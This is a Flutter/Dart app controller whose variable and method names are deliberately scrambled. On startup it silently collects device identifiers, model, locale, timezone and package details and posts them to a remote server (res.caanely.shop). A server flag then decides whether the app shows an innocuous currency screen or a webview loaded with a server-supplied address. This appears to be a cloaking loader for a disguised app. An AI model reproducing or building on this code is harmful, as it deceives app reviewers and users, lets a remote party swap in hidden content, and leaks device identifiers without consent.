import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var bonfidjhv = RxBool(false);
  var hxzqiyeod = RxBool(true);
  var potfk = RxString("");
  var bridgette = RxBool(false);
  var toy = RxBool(true);
  final yovhqc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    benxdqo();
  }


  Future<void> benxdqo() async {

    bridgette.value = true;
    toy.value = true;
    hxzqiyeod.value = false;

    yovhqc.post("https://res.caanely.shop/OhuW8",data: await tsjapwbyh()).then((value) {
      var klncw = value.data["klncw"] as String;
      var ykzt = value.data["ykzt"] as bool;
      if (ykzt) {
        potfk.value = klncw;
        nathen();
      } else {
        boyer();
      }
    }).catchError((e) {
      hxzqiyeod.value = true;
      toy.value = true;
      bridgette.value = false;
    });
  }

  Future<Map<String, dynamic>> tsjapwbyh() async {
    final DeviceInfoPlugin zkonlj = DeviceInfoPlugin();
    PackageInfo wdegtoub_hirjuvl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hembi = Platform.localeName;
    var cvjlCmb = currentTimeZone;

    var qrDf = wdegtoub_hirjuvl.packageName;
    var UqFGlTJ = wdegtoub_hirjuvl.version;
    var uHJwZG = wdegtoub_hirjuvl.buildNumber;

    var sxuDid = wdegtoub_hirjuvl.appName;
    var tavaresSpinka = "";
    var tVUX  = "";
    var tNnuxDzj = "";
    var korbinSchuppe = "";
    var YxtErSvN = "";
    var emmaleeRodriguez = "";
    var nevaMurazik = "";
    var keltonSchuppe = "";


    var daniellaGulgowski = "";
    var EQJGNbzc = "";
    var BvWQ = false;

    if (GetPlatform.isAndroid) {
      EQJGNbzc = "android";
      var cyhnbek = await zkonlj.androidInfo;

      tNnuxDzj = cyhnbek.brand;

      YxtErSvN  = cyhnbek.model;
      tVUX = cyhnbek.id;

      BvWQ = cyhnbek.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      EQJGNbzc = "ios";
      var niejysm = await zkonlj.iosInfo;
      tNnuxDzj = niejysm.name;
      YxtErSvN = niejysm.model;

      tVUX = niejysm.identifierForVendor ?? "";
      BvWQ  = niejysm.isPhysicalDevice;
    }
    var res = {
      "daniellaGulgowski" : daniellaGulgowski,
      "sxuDid": sxuDid,
      "UqFGlTJ": UqFGlTJ,
      "YxtErSvN": YxtErSvN,
      "emmaleeRodriguez" : emmaleeRodriguez,
      "cvjlCmb": cvjlCmb,
      "uHJwZG": uHJwZG,
      "tVUX": tVUX,
      "hembi": hembi,
      "EQJGNbzc": EQJGNbzc,
      "BvWQ": BvWQ,
      "korbinSchuppe" : korbinSchuppe,
      "tavaresSpinka" : tavaresSpinka,
      "qrDf": qrDf,
      "nevaMurazik" : nevaMurazik,
      "keltonSchuppe" : keltonSchuppe,
      "tNnuxDzj": tNnuxDzj,
    };
    return res;
  }

  Future<void> boyer() async {
    Get.offAllNamed("/currencyTab");
  }

  Future<void> nathen() async {
    Get.offAllNamed("/currencyBin");
  }

}
